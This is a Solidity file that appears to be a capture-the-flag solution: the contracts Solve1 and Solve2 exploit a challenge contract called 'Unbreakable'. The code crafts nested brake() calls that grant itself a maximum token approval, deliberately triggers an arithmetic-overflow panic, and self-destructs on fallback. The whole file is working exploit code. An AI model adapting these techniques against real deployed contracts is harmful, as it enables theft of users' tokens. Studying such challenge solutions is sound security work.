pragma solidity 0.8.11;

import "./Unbreakable.sol";

contract Solve1 {
    constructor(Unbreakable instance) {
        bytes memory reward = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );
        Unbreakable.Solution memory solution = Unbreakable.Solution(
            5,
            bytes32(uint256(uint160(address(this)))),
            250000,
            "",
            reward
        );
        instance.brake(solution);
    }
}

contract Solve2 {
    constructor(Unbreakable instance, address s1) {
        bytes memory panic17 = abi.encodeWithSignature(
            "increaseAllowance(address,uint256)",
            s1,
            1
        );
        // first revert and then trigger Panic(17)
        Unbreakable.Solution memory solution2 = Unbreakable.Solution(
            5,
            bytes32(uint256(uint160(address(this)))),
            0,
            string(panic17),
            ""
        );
        bytes memory secondBrake = abi.encodeWithSignature(
            "brake((uint256,bytes32,uint256,string,bytes))",
            solution2
        );

        Unbreakable.Solution memory solution1 = Unbreakable.Solution(
            5,
            bytes32(uint256(uint160(address(this)))),
            312500,
            "",
            secondBrake
        );
        instance.brake(solution1);
    }

    function finalize(Unbreakable instance) public {
        bytes memory error_str = abi.encodeWithSignature(
            "doStorageMaintenance()"
        );
        Unbreakable.Solution memory solution = Unbreakable.Solution(
            5,
            bytes32(uint256(uint160(address(this)))),
            0,
            string(error_str),
            ""
        );
        instance.brake(solution);
    }

    function _fallback() internal {
        selfdestruct(payable(address(0)));
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }
}
